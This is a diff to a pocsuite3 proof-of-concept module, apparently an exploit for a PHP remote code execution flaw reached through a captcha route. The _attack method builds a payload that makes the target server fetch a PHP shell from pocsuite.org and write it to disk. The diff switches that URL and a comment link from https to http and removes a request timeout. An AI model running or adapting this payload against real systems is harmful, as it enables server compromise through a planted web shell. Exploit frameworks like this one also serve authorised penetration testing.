@@ -1,7 +1,7 @@
 """
 If you have issues about development, please read:
 https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
-for more about information, plz visit https://pocsuite.org
+for more about information, plz visit http://pocsuite.org
 """
 
 from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
@@ -38,7 +38,7 @@ class DemoPOC(POCBase):
             headers = {
                 "Content-Type": "application/x-www-form-urlencoded"
             }
-            r = requests.post(vul_url, data=data, headers=headers,timeout=5)
+            r = requests.post(vul_url, data=data, headers=headers)
 
             if flag in r.text:
                 return payload, data
@@ -57,7 +57,7 @@ class DemoPOC(POCBase):
     def _attack(self):
         result = {}
         filename = random_str(6) + ".php"
-        shell_addr = "https://pocsuite.org/include_files/php_attack.txt"
+        shell_addr = "http://pocsuite.org/include_files/php_attack.txt"
         payload = "/index.php?s=captcha&Test=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))".format(
             filename=filename,
             url=shell_addr)
